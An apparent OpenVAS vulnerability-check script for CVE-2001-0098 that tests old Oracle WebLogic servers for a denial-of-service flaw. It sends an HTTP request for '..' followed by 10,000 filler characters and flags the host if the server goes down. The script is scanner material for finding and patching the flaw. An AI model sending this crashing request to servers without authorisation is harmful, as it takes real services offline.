CPE = "cpe:/a:oracle:weblogic_server";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10697" );
	script_version( "2021-05-10T09:07:58+0000" );
	script_tag( name: "last_modification", value: "2021-05-10 09:07:58 +0000 (Mon, 10 May 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 2138 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2001-0098" );
	script_name( "WebLogic Server DoS" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2001 StrongHoldNet" );
	script_family( "Web Servers" );
	script_dependencies( "gb_oracle_weblogic_consolidation.sc" );
	script_mandatory_keys( "oracle/weblogic/detected" );
	script_tag( name: "solution", value: "Upgrade to at least WebLogic 5.1 with Service Pack 7." );
	script_tag( name: "summary", value: "Requesting an overly long URL starting with a double dot
  can crash certain version of WebLogic servers." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
req = http_get( item: NASLString( "..", crap( 10000 ) ), port: port );
send( socket: soc, data: req );
http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

